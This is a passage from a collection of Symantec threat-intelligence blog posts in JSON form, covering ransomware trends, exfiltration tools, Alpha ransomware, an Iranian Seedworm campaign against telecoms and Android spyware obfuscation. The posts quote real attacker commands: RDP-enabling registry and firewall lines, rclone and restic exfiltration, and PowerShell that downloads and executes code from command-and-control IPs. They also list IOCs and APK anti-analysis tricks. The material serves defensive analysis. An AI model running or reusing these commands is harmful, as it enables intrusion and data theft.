1a87e1b41341ad042711faa0c601e7b238a47fa647c325f66b1c8c7b313c8bdf – SiestaGraph fe8f99445ad139160a47b109a8f3291eef9c6a23b4869c48d341380d608ed4cb – SiestaGraph 7fc54a287c08cde70fe860f7c65ff71ade24dfeedafdfea62a8a6ee57cc91950 – SiestaGraph The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/graph-api-threats"
  },
  {
    "title": "ransomware attacks exploits",
    "content": "Ransomware activity remains on an upward trend despite the number of attacks claimed by ransomware actors decreasing by slightly more than 20% in the fourth quarter of 2023. Attackers have continually refined their tactics and proven quick to respond to disruption, finding new ways to infect victims. Analysis of data from ransomware leak sites shows that attackers managed to hit significantly more victims last year (4,700) compared to 2022 (2,800). While the shutdown of the Qakbot botnet in June 2023 took a major malware distribution channel offline, attackers have quickly adapted and vulnerability exploitation now appears to be the primary vector for ransomware attacks. LockBit, the longstanding ransomware-as-service operation run by the Syrphid cybercrime group (aka Bitwise Spider), continued to be the largest ransomware threat in 2023, accounting for 21% of all attacks claimed on data leak sites. It was followed by Noberus (aka BlackCat, ALPHV) with 9% of all claimed attacks and Clop with 8%. BothLockBitandNoberushave been the target of law enforcement operations in recent weeks and it remains to be seen if these will significantly impact on activity levels from both threats over the long term. Interestingly, there are significant disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit was responsible for over 21% of the 4,700 attacks claimed in 2023, they were only identified as being involved in around 17% of the attacks Symantec investigated. Conversely, Noberus claimed 9% of all attacks in 2023 but it was involved in a little over 20% of all attacks Symantec investigated. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that Noberus affiliates are more likely to advance their attacks at least to the payload deployment stage. The evidence from recent ransomware investigations suggests that exploitation of known vulnerabilities in public facing applications is now the main vector for ransomware attacks. Likely infection vectors in recent ransomware attacks include: The number of tools deployed by ransomware actors continues to grow. In particular, there has been a marked increase in the number of dual-use tools (legitimate software installed by attackers for malicious purposes). Tools leveraging the Bring Your Own Vulnerable Driver (BYOVD) technique are also currently popular among attackers. New tools recently seen in ransomware attacks include: Noteworthy techniques that have recently been used by ransomware actors include: Ransomware will continue to be a major threat for organizations in 2024 and beyond. Incentivised by large payouts, ransomware attackers have proven to be persistent and adaptive, capable of responding to disruption by reorganizing themselves and consistently developing new tactics. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 7ebe51d5a48cc3c01878e06c6db3f4f0189c4f9788bfe57b763b03f4ab910e26 – StealBit ce26642327aa55c67a564f695ae3038d5afee9b8d14bb5146bf30dd0f1af24e5 – StealBit c06e320ad2568e15baae155346c6fb92e18fc038e7465adfb5fc2a3f8af9caa5 – HopToDesk 8d5c521d7a52fd0b24d15c61c344a8f87b3b623a1ab3520ab55197b772377155 – TrueSightKiller 09f7622eb9ed3bbd375575c8a190ff152ef3572a717a20c1b2dd5556b8cc9eba – TrueSightKiller 005cfd8a4dd101c127bcb0f94f1fa143b24d91442ee9e1525b4c540c9fe88c63 – TrueSightKiller 4c1346eab3fb23ca0613d73bbd2dd87fedb6ca8b1ba7bf48d69a57868d05854d – TrueSightKiller 13d525588d2f6babe0b6de7d1456a6f3f39a0947128280a94b6f676dd5684201 – TrueSightKiller 6ec7a25adc9bf516e9150bebd773feafa64787769156ffbcb6eccabc579ee03a – GhostDriver 19707b18f750bae0214e2a6d36735b6723549899bf83751d3650b9ec8125b91f – DPAPI credential dumper The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-attacks-exploits"
  },
  {
    "title": "ransomware data exfiltration",
    "content": "Ransomware actors are deploying a growing array of data-exfiltration tools in their attacks and, over the past three months alone, Symantec has found attackers using at least dozen different tools capable of data exfiltration. While some exfiltration tools are malware, the vast majority are dual-use – legitimate software used by the attackers for malicious purposes. Double extortion attacks are now standard practice for most ransomware operators. In addition to encrypting files, attackers steal data from victims and threaten to release it unless the ransom is paid. The tactic has proven to be effective, supplying attackers with more leverage to use against organizations that may be able to restore encrypted files from backups. The range of tools now being used by ransomware actors for exfiltration is growing. It would appear that this trend is driven by two factors: A growing awareness among attackers of the potential functionality in certain types of software; and a desire to find lesser-known alternatives to tools that have gained a reputation for malicious usage. While Rclone is still the most frequently used exfiltration tool by ransomware actors, the fastest growing category is remote administration and remote management tools, such as AnyDesk, ScreenConnect, and Atera. The functionality of these tools lies behind their appeal to attackers, since exfiltration is just one of their capabilities and most can act as a de-facto backdoor on a compromised computer. The most frequently used exfiltration tools over the past three months include: Rclone:Open-source toolthat can legitimately be used to manage content in the cloud, but has been seen being abused by ransomware actors to exfiltrate data from victim machines. For an example of how Rclone may be used, see case study below. AnyDesk: A legitimateremote desktop application. By installing it, attackers can obtain remote access to computers on a network. Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. RDP: Remote Desktop Protocol. A Microsoft-developed protocol that allows a computer to connect to and control another computer, using client/server software. Attackers can attempt to enable RDP using a variety of techniques, including leveraging multiple living-off-the-land tools. Once RDP is enabled, it allows the attackers to use any number of dual-use tools that leverage the RDP protocol.For example, an attacker may attempt to enable RDP by simply modifying a registry key: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f The attacker may also attempt to create a firewall rule to specifically allow all incoming RDP connections using a Network Shell (netsh) command: netsh advfirewall firewall add rule name=[NAME] RemoteDesktop\" dir=in protocol=TCP localport=3389 action=allow Cobalt Strike: An off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files. It ostensibly has legitimate uses as a penetration-testing tool but is invariably exploited by malicious actors. Cobalt Strikes has been used for data exfiltration, with attackers leveraging Cobalt Strike's Beacon payload to establish covert communication channels with compromised systems, allowing them to exfiltrate sensitive data stealthily. The tool's ability to mimic normal network traffic and blend in with legitimate activity enables attackers to surreptitiously transfer valuable information from compromised networks. ScreenConnect:Aremote desktop application tool by ConnectWise, used to enable remote access to computers. Atera:Legitimate remote monitoring and access software. It and similar tools are often used by attackers to obtain remote access to computers on a network. WinRAR:Anarchive managerthat can be used to archive or zip files. Attackers have used WinRAR and similar utilities (e.g. 7-Zip) in order to prepare files for exfiltration: cmd /u [REMOVED] CSIDL_COMMON_APPDATA\\rar.exe a -dh -hp[REMOVED] -m5 CSIDL_COMMON_APPDATA\\1.rar CSIDL_COMMON_APPDATA\\1.txt > CSIDL_COMMON_APPDATA\\log.txt Restic:Open-sourcecommand line backup tooldesigned to be efficient and secure and will work with various platforms including Windows, Linux, and OSX. Restic supports various storage backends, including local directories, SFTP servers, Amazon S3, Microsoft Azure, and Google Cloud Storage, which has made it a popular choice for ransomware actors. The following is an example of Restic commands used by attackers using the Noberus ransomware. The “init” command initializes a new repository. The “-r” switch specifies the repository to backup to or restore from, while the “-use-fs-snapshot” switch instructs the application to use the file system snapshot where possible. CSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ init [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txtCSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txt --use-fs-snapshot --verbose backup \"CSIDL_SYSTEM_DRIVE\\[REMOVED]\" TightVNC:Open-sourceremote desktop software. WinSCP:Alegitimate SFTP client and FTP clientfor Microsoft Windows. Pandora RC:Pandora Remote control (formerly known as eHorus) is a legitimate remote access tool that is sold commercially and has agents for Windows, Linux, and Mac workstations. It has also been leveraged by attackers, mainly to facilitate remote access and deployment of additional tools to assist in credential dumping and lateral movement. However, Pandora RC may also be used to facilitate exfiltration of sensitive information from targeted organizations. The remote management platform can be used from any device with a web browser. Chisel:Chisel is anopen-source proxy tool. It was designed to create encrypted, tunnelled connections, commonly used in network security testing and penetration testing scenarios. However, it has been abused during ransomware attacks to create tunnels to attacker-controlled infrastructure as part of data exfiltration activities. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PowerShell:Microsoft scripting toolthat can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance. In several ransomware attacks, the attackers have executed specific commands in order to facilitate data exfiltration, including use of the Compress-Archive cmdlet: powershell Compress-Archive CSIDL_PROFILE\\public\\[REMOVED]-fs CSIDL_PROFILE\\public\\[REMOVED]-fs.zip Rclone is anopen-source toolwhose legitimate uses include online backups and managing content in the cloud. Ransomware attackers use its capabilities to exfiltrate data from compromised networks. It is usually installed by the attackers themselves once they have infiltrated a targeted network. Rclone is now so frequently used by ransomware groups that many attackers will now rename Rclone to masquerade as something else (e.g. svchost.exe). A RagnarLocker attack which occurred in July 2023 provides an example of how Rclone can be used by ransomware actors. The first evidence of malicious activity occurred when PowerShell commands were executed to disable Local Security Authority (LSA) protection. The attackers then ran SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for the discovery of host names and network services. The next day, the attackers resumed their activity, deploying Mimikatz and LaZagne to dump credentials, before using a number of living-off-the-land tools to gather system information, save registry hives, execute commands on other computers on the network, and enable the Remote Desktop Protocol (RDP) to facilitate remote access. The attackers then began using Rclone to copy data from network shares, e.g. rclone copy \\\\[REMOVED]\\[REMOVED]\\Shares --max-age 2095d [REMOVED]:[REMOVED]/ -P --exclude \"*.{zip,log,rar,wav,mp4,mpeg}\" --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 Interestingly, there were frequent typos in the commands issued by the attackers, suggesting hands-on-keyboard activity rather than automation. The attackers then initiated Rclone connections to the Put.io file-sharing service, which acted as the destination for the exfiltrated data: https://s100.put[.]io https://s101.put[.]io https://s102.put[.]io https://s103.put[.]io https://upload.put[.]io Once the data was exfiltrated, the attackers moved on to the next stage of the attack, deployment of the RagnarLocker payload and encryption of files. Data exfiltration is now a key step in the attack chain for most ransomware actors and many see stolen data as their most effective way of extorting organizations, creating darknet data leak sites naming their victims and publishing stolen data if a ransom isn’t paid. While some malware is still being authored for this purpose, many attackers are turning to legitimate software packages in the belief that they are less likely to trigger alerts when deployed on their victims’ networks. Symantec Adaptive Protectionhelps to close attack routes available to attackers using living-of-the-land and dual-use tools. Adaptive allows users to: For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-data-exfiltration"
  },
  {
    "title": "alpha netwalker ransomware",
    "content": "Alpha, a new ransomware that first appeared in February 2023 and stepped up its operations in recent weeks, has strong similarities to the long-defunct NetWalker ransomware, which disappeared in January 2021 following aninternational law enforcement operation. Analysis of Alpha reveals significant similarities with the old NetWalker ransomware. Both threats use a similar PowerShell-based loader to deliver the payload. In addition to this, there is a significant amount of code overlap between the Alpha and NetWalker payloads. This includes: While Alpha first appeared in February 2023, it maintained a low profile until recent weeks when it appeared to begin scaling up its operations and launching a data leak site. In recent attacks involving Alpha, the attackers made heavy use of a number of living-off-the-land tools, including: NetWalker was part of the first wave of cybercrime operations to profit from targeted ransomware attacks, where attackers attempt to encrypt entire networks in order to extort their victims. One jailed group member alone is alleged to have earned over $27.6 million from attacks. Following the law enforcement operation and long cessation of activity, it had been assumed that NetWalker had completely departed. However, the similarities between Alpha and the NetWalker ransomware suggest a strong link between the two threats. Alpha may be an attempt at reviving the old ransomware operation by one or more of the original NetWalker developers. Alternatively, the attackers behind Alpha may have acquired and modified the original NetWalker payload in order to launch their own ransomware operation. For the latest protection updates on Alpha, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 46569bf23a2f00f6bac5de6101b8f771feb972d104633f84e13d9bc98b844520 - PowerShell loader 6462b8825e02cf55dc905dd42f0b4777dfd5aa4ff777e3e8fe71d57b7d9934e7 - PowerShell loader 6e204e39121109dafcb618b33191f8e977a433470a0c43af7f39724395f1343e - PowerShell loader 89bfcbf74607ad6d532495de081a1353fc3cf4cd4a00df7b1ba06c10c2de3972 - PowerShell loader e43b1e06304f39dfcc5e59cf42f7a17f3818439f435ceba9445c56fe607d59ea - PowerShell loader e573d2fec8731580ab620430f55081ceb7153d0344f2094e28785950fb17f499 - Alpha ransomware loader e68dd7f20cd31309479ece3f1c8578c9f93c0a7154dcf21abce30e75b25da96b - Alpha ransomware loader ab317c082c910cfe89214b31a0933eaab6c766158984f7aafb9943aef7ec6cbb - Alpha ransomware loader df15266a9967320405b3771d0b7353dc5a4fb1cbf935010bc3c8c0e2fe17fb94 - Alpha ransomware loader b7ca6d401b051712cb5b1a388a2135921a4420db8fe41842d51d2ec27380b479 - Alpha ransomware loader 5f3bf9c07eedde053f19ce134caa7587f8fb6c466e33256e1253f3a9450b7110 - Alpha ransomware loader c00fbf3fb992e7f237c396d69081246570cbd60d6c7a2262c01ae4d8e6f17ddd - Alpha ransomware loader b2adf8ec7ab5193c7358f6acb30b003493466daee33ea416e3f703e744f73b7d - Alpha ransomware loader a8d350bbe8d9ccfbb0c3e9c2dd9251c957d18ce13ae405ceb2f2d087c115db15 - Alpha ransomware loader 2d07f0425dc465b3a1267a672c1293f9a3d0cd23106b7be490807fea490978ea - Alpha ransomware loader f5d25777331ba55d80e064dea72240c1524ffcd3870555a8c34ff5377def3729 - Alpha ransomware loader 9d6ed8396ee79ae92a5e6cef718add321226def3461711cf585e0fd302c961ae - Alpha ransomware loader 1c12ff296e7d9f90391e45f8a1d82d8140edf98d616a7da28741094d60d4779d - Alpha ransomware loader 9c71500a9472814f7bf97a462fe9822cf93dc41e2e34cc068734586d5e5146ef - Alpha ransomware loader 480cf54686bd50157701d93cc729ecf70c14cd1acd2cb622b38fc25e23dfbc26 - Alpha ransomware loader 0bad18cb64b14a689965540126e0adbc952f090f1fb7b6447fe897a073860cdb - Alpha ransomware loader c5f7492a3e763b4456afbb181248fdb8e652575cea286db7861e97ffcd1b72e4 - Alpha ransomware loader f3858d29073ae90f90c9bb284913752533fe1a6437edd6536e4b1775fc8f6db4 - Alpha ransomware loader The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/alpha-netwalker-ransomware"
  },
  {
    "title": "ransomware threat landscape 2024",
    "content": "Although we are just a few weeks into the new year, ransomware attacks – and their costly impact on today’s enterprises –  are already makingheadlines. According to our new report,The 2024 Ransomware Threat Landscape, published today by the Symantec Threat Hunter Team, part of Broadcom, “ransomware continues to be one of the most lucrative forms of cybercrime and, as such, remains a critical threat for organizations of all sizes.” The new report analyzes the ransomware threat landscape over the past 12 months, from new operators in the field to attackers’ top tools and tactics, techniques, and procedures (TTPs) and providesactionableintelligence – including real-world attacker case studies – that can help organizations stop attacks early in the attack chain. Among the report’s key findings: Based on these findings and other intelligence, we can expect the following ransomware trends to continue through 2024 and beyond: One thing we know for certain – ransomware will remain a persistent threat to all organizations, regardless of size. To help mitigate this risk, organizations should adopt a defense-in-depth strategy, using multiple detection, protection, and hardening technologies to mitigate risk at each point of a potential attack chain. In addition, organizations should prioritize deepening their knowledge of current infection vectors used and commonly employed in ransomware attacks. This information will assist in prioritizing and identifying potential areas of weakness and help strengthen a defensive posture. As a result, defenders increasingly are turning toSymantec Adaptive Protectionin their fight against ransomware. To help close the attack routes available using living-of-the-land tools, Symantec Adaptive Protection maps out the different attack methods used by attackers and displays this data in the form of a heatmap for quick reference. Incident responders can leverage this data to understand which living-of-the-land tools are being used in various different attacks such as advanced persistent threats (APTs) and ransomware. Symantec is currently tracking 70 specific behaviors across 54 living-of-the-land tools and is uniquely positioned to quickly react and update this data based off the changing landscape. Next month, we will be publishing a paper focusing on how Adaptive Protection strategies increase efficacy and efficiency. Check back with us for more details in the coming weeks. What was our team’s number one learning about ransomware in 2023? The ransomware cybercrime ecosystem is highly durable and continues to survive disruption from law enforcement and other efforts. Yet, the good news is that there are steps you can take today to reduce the risk of ransomware. By combining actionable intelligence about ransomware attackers TTPs with Symantec Adaptive Protection, defenders can better understand how their organizations might be compromised – and take the necessary steps to protect against it. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-threat-landscape-2024"
  },
  {
    "title": "iran apt seedworm africa telecoms",
    "content": "Iranian espionage group Seedworm (aka Muddywater) has been targeting organizations operating in the telecommunications sector in Egypt, Sudan, and Tanzania. Seedworm has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East. It has beenpublicly statedthat Seedworm is a cyberespionage group that is believed to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS). The attackers used a variety of tools in this activity, which occurred in November 2023, including leveraging the MuddyC2Go infrastructure, which was recentlydiscovered and documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated. The attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with Seedworm activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools. The attacks in this campaign occurred in November 2023. Most of the activity we observed occurred on one telecommunications organization. The first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor. A MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder “csidl_common_appdata\\javax”, which seems to have been sideloaded by jabswitch.exe. Jabswitch.exe is a legitimate Java Platform SE 8 executable. The MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server: tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri =\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content; It appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection by security software, as they are unused and not relevant. Right after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created: \"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\" The attackers also used some typical commands related to the Impacket WMIExec hacktool: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1698662615.0451615 2>&1 The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool: CSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q The attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine: $uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content; Notably, this organization is believed to have previously been infiltrated by Seedworm earlier in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including: During that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer on the victim network. At the time, this activity couldn’t be definitively linked to Seedworm, but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers. In another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known Seedworm infrastructure. A custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity. In the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity in the past. The most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe. The malware reads the C&C URL from the Windows registry value “End” stored inside the key “HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip”. The URL path is read from the “Status” value in the same aforementioned key. Lastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received: powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content; The MuddyC2Go framework was first publicly written about ina blog published by Deep Instinct researchers on November 8, 2023. That blog documented its use in attacks on organizations in countries in the Middle East. The researchers said the framework may have been used by Seedworm since 2020. They also said that the framework, which is written in Go, has replaced Seedworm’s previous PhonyC2 C&C infrastructure. This replacement appears to have occurred after thePhonyC2 source code was leaked earlier in 2023. The full capabilities of MuddyC2Go are not yet known, but the executable contains an embedded PowerShell script that automatically connects to Seedworm’s C&C server, which eliminates the need for manual execution by an operator and gives the attackers remote access to a victim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by the framework. It also said that the MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider that is known to host malicious activity. Other tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines. SimpleHelp isbelieved to have been used in attacks carried out by Seedworm since at least July 2022. Once installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user’s device at any point in time, even after a reboot. SimpleHelp also allows attackers to execute commands on a device with administrator privileges. SimpleHelp is now strongly associated with Seedworm activity and the tool is installed on several of Seedworm’s servers. Venom Proxy isa publicly available toolthat is described as “a multi-hop proxy tool developed for penetration testers.” It is written in Go. It can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with Seedworm since at least mid-2022, withMicrosoft describing it as Seedworm’s “tool of choice” in an August 2022 blog. Seedworm tends to use a custom build of Venom Proxy in its activity. Other tools used in this activity include: Seedworm has long had an interest in telecommunications organizations, as do many groups engaged in cyberespionage activities. However, its strong focus on African organizations in this campaign is notable as, while it has been known to target organizations in Africa in the past, it does generally primarily focus on organizations in countries in the Middle East. That one of the victim organizations in this campaign is based in Egypt is also of note given Egypt’s proximity to Israel, a frequent target of Seedworm. Seedworm appears to remain focused on using a wide array of living-off-the-land and publicly available tools in its attack chains, no doubt in an effort to remain undetected on victim networks for as long as possible. However, its recent more wide adoption of new C&C infrastructure in the form of MuddyC2Go is notable and shows that the group continues to innovate and develop its toolset when required in order to keep its activity under the radar. While the group uses a lot of living-off-the-land and publicly available tools, it is also capable of developing its own custom tools, such as the custom build of Venom Proxy and the custom keylogger used in this campaign. The group still makes heavy use of PowerShell and PowerShell-related tools and scripts, underlining the need for organizations to be aware of suspicious use of PowerShell on their networks. The activity observed by Symantec’s Threat Hunter Team took place in November 2023, showing that Seedworm is very much a currently active threat faced by organizations that may be of strategic interest to Iranian threat actors. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 1a0827082d4b517b643c86ee678eaa53f85f1b33ad409a23c50164c3909fdaca – MuddyC2Go DLL launcher 25b985ce5d7bf15015553e30927691e7673a68ad071693bf6d0284b069ca6d6a – Benign Java(TM) Platform SE 8 executable used for sideloading MuddyC2Go DLL eac8e7989c676b9a894ef366357f1cf8e285abde083fbdf92b3619f707ce292f – Custom keylogger 3916ba913e4d9a46cfce437b18735bbb5cc119cc97970946a1ac4eab6ab39230 – Venom Proxy 146.70.124[.]102 – SimpleHelp C&C server 94.131.109[.]65 – MuddyC2Go C&C server 95.164.38[.]99 –MuddyC2Go C&C server 45.67.230[.]91 – MuddyC2Go C&C server 45.150.64(.)39 - MuddyC2Go C&C server 95.164.46[.]199 – MuddyC2Go C&C server 94.131.98[.]14 – MuddyC2Go C&C server 94.131.3[.]160 – GoSOCKS5proxy C&C server The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/iran-apt-seedworm-africa-telecoms"
  },
  {
    "title": "spyware obfuscation static analysis",
    "content": "With the surging popularity of mobile applications, the landscape of cybersecurity is encountering increasingly intricate and discreet forms of malicious software. One common strategy in the realm of cybersecurity is code obfuscation. This practice involves the deliberate alteration of various elements within the code, such as variables, functions, and class names, rendering them virtually indecipherable. This not only poses a formidable challenge for anyone attempting to discern their purpose from their names but also significantly amplifies the complexity involved in decompilation. Recently, our attention was caught by a Spyware cluster, which has employed a series of ingenious techniques to heighten the difficulties associated with static analysis. These methods, which we will discuss below, draw inspiration from diverse sources, some originating from resilient services and others from various \"tools\" at the disposal of these unscrupulous actors. The world of mobile application security is rife with inventive techniques for concealing essential resources within APK files, the containers that hold Android applications. One such strategy involves creating directories within the APK that share the same names and permissions as vital resources. Figure 1 provides a visual representation of this approach. This technique presents complications for various analysis tools. For instance, Jadx, a popular decompiler for Android applications, can encounter problems when attempting to extract the AndroidManifest.xml file from these disguised directories. Figure 2 shows the wrong extraction in Jadx. Another sneaky method involves hiding critical resources within an APK using an unsupported compression method for the local file header, while employing the correct compression method in the central directory file header. Figure 3 is the snapshot of deceptive compression code. This deceptive      maneuver also leads to issues with certain tools, including third-party libraries, causing them to malfunction. Figure 4 shows the error messages printed from the tools. Nonetheless, Android can manage this effectively because it can retrieve the “correct” compression method from the central directory file header. Exploring further within these covert techniques, we encounter the intriguing utilization of \"no compression\" data. Android currently supports both the no compression mode and the standard deflate compression mode (as shown in Figure 6). Traditionally, in Android's mapping, the no compression entry is represented as zero and begins with “00 00” (as seen in Figure 7). However, what piqued our interest is the presence of obfuscated entry codes within this spyware cluster (as displayed in Figures 8 and 9). Despite these unique entry codes, these spyware variants can still be installed on Android devices. Android's support for both the no compression and standard deflate compression methods is pivotal in managing these scenarios. For higher Android versions that employ APK signature schemes V2 and V3, the system adeptly handles \"no compression\" even when faced with unsupported compression entry codes in both file headers. This seamless handling ensures the smooth installation of APKs, despite the presence of obfuscated entry codes (as evident in Figure 10). Then this group of spywares makes use of the design, and specifies them to support APK signature schemes V2 and V3 only (Figure 11, 12). We can see the V2 and V3 signatures schemes as well as the APK signature block number for V2+ (Figure 13). By doing so, these spywares effectively shield themselves from static analysis by various commonly used tools. For example, Apktool may falter in decoding due to the usage of a non-standard compression method (Figure 14). Zipping libraries like Unzip and 7z may struggle to extract files, as they strictly adhere to the legal ZIP format (Figure 15). Jadx may also face challenges when dealing with files manipulated in this manner (Figure 16). “Obfuscated” AndroidManifest.xml and resources.arsc files can disrupt reverse engineering tools. With invalid attributes and illegal resource IDs, for example, the Android system doesn't parse illegal resource ID numbers, so while adding such a redundant attribute may not affect the APK's regular functionality, it can still cause issues with reverse engineering tools like Apktool, Jadx, JEB, etc. (Figure 17). The spyware cluster, along with its variants, goes to great lengths to conceal its true identity by masquerading as well-known games, popular apps, and even system-level applications. Among the list of decoys are prominent names like Play Store, Google TV, Google Meet, Google Translate, Chrome, YouTube, Netflix, TikTok, Discord, Spotify, Angry Birds, Facebook Lite, Instagram, , Disney+, Snapchat, and Android Settings. To further enhance their deception, they engage in app repackaging, essentially dressing themselves up as these widely recognized apps to appear even more convincing to unsuspecting users. When an unsuspecting user installs and opens one of these misleading applications, it will persistently seek accessibility permissions (as depicted in Figure 19). While this may appear innocuous, it is merely the beginning of a more complex operation. Through interactions with the user interface, these apps discreetly secure sensitive permissions and disable power optimization, as demonstrated in GIF 1. Although the default servers are not valid so far. To gather additional data and simulate the responses necessary to trigger malicious behaviors, we set up a mock server. The deceptive apps send fundamental app data, system information, and configuration details to this server and await further instructions (Figure 21). Moreover, once granted accessibility access, these apps can monitor and report a user's application activities to a designated server (Figure 22). All this activity is transmitted to the server after being encrypted (Figure 23). Let's delve into the intricacies of the C&C sections. These sections intentionally introduce noise, including junk code and irrelevant strings, into essential methods such as communication and command parsing (Figure 24). Their aim is to disrupt the functioning of static analysis tools like Jadx. By stripping away this noise, we can discern that the server's response adheres to a specific format (Figure 25). The length components have variable lengths and end with '0', while the data content incorporates commands with GZIP compression. The command handler AsyncTask is awaiting valid commands to be delivered from the server after launching the application (Figure 26). Once we remove the noise from the command parser code, it becomes evident that it possesses substantial capabilities. We listed a few of them in Table 1. To verify our findings, we employed a toast alert and sendSMS command for testing purposes. The commands delivered by our mock server were executed successfully (Figure 27). The spywares also have anti-killing/uninstalling methods to protect themselves. When the app detects that the user is trying to kill or uninstall itself through accessibility, it triggers the 'HOME' or 'BACK' action (Figure 28). In the realm of mobile application security, we've explored a range of deceptive tactics, including resource camouflage, compression trickery, signature scheme evasion, and resource obfuscation. These techniques pose challenges for users and defenders, making it crucial for security experts to understand these tactics to counter evolving threats effectively. Users who have installedBroadcom SEP Mobilewill be shielded from this particular set of spyware threats. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec recommends users follow these best practices to stay protected from mobile threats: Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing 